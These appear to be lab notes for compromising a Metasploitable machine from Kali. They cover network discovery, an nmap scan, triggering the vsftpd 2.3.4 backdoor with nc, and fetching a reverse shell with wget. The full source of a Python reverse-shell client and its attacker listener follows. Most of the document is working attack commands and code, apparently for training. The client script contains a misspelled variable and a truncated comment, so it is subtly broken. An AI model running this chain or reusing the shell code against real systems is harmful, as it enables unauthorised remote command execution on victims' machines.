Procedure-------------------------------------------------------------------------------------------------------------------------------------------------------------------

kali-CMD sudo netdiscover                               #Find the IPs on the network PREP

Kali-CMD nmap -sV 192.168.1.100                         #View the ports being used and the version of each application PREP

kali-CMD2 python3 ~/Desktop/shell/shellServer.py        #This opens the shellServer.py file where it is located and looks for a connection DURING

kali-CMD3 cd ~/Desktop/shell                            #Starts the server the will serve the reverseShell.py on the Metasploitable server
          python3 -m http.server 8080

kali-CMD4 nc 192.168.1.100 21                           #Connects Kali system to port 21 (FTP) and on this vsftp 2.3.4 it opens a backdoor on port 6200 DURING
    user Hacker:)
    pass invalid

kali-CMD5  nc 192.168.1.100 6200                          #Connecting into the backdoor DURING
           mkdir shell                                    #Make the directory if needed
           cd shell                                       #Connect into the directory that the reverseShell.py is located
           wget 192.168.1.101:8080/reverseShell.py        #Starts the reverse shell on the external machine 192.168.1.100

           python reverseShell.py 192.168.1.101 &         #It will now connect to the server

[cat displays the file in CMD] Example: cat reverseShell.py

Kali 192.168.1.101                    Meta 192.168.1.100

CODE-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

reverseShell.py

import sys
from subprocess import Popen, PIPE
from socket import *
serverName = sys.argv[1]                                        	(Attackers IP from the first command line)
serverPort = 8000
#Create IPv4(AF_INET, TCPSocket(Sock_Stream)
clientSocket = socket(AF_INET, SOCK_STREAM)                     	(Creating a client socket IPv4 and Socket)
clientSocket.connect((serverName, serverPort))                  	(Not that the socket is created we can connect by supplying a TUPLE containing the sockets IP and port number)
clientSocket.send('bot reporting for duty'.encode())			(This it to notify the attacker the machine is ready to accept attacks)
command = clientSocket.recv(4064).decode()				(It needs to be decoded if we want it to view as a string)
while command != "exit":
	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)	(The client will continue accepting and executing commands until the hacker sends the exit command) (Popen creates a copy or a fork [subprocess])
	result, err = proc.communicate()				(
	clientSpclet.send(result)
	command = (clientSocket.recv(4064)).decode()

clientSocket.close()

shellServer.py

from socket import *
serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)
print("Attacker box listening and awaiting instructions")
connectionSocket, addr = serverSocket.accept()
print("Thanks for connecting to me "
	+str(addr))
message = connectionSocket.recv(1024)
print(message)
command =""
while command != "exit":
	command = input("Please enter a command: ")
	connectionSocket.send(command.encode())
	message = connectionSocket.recv(1024).decode()
	print(message)

connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()
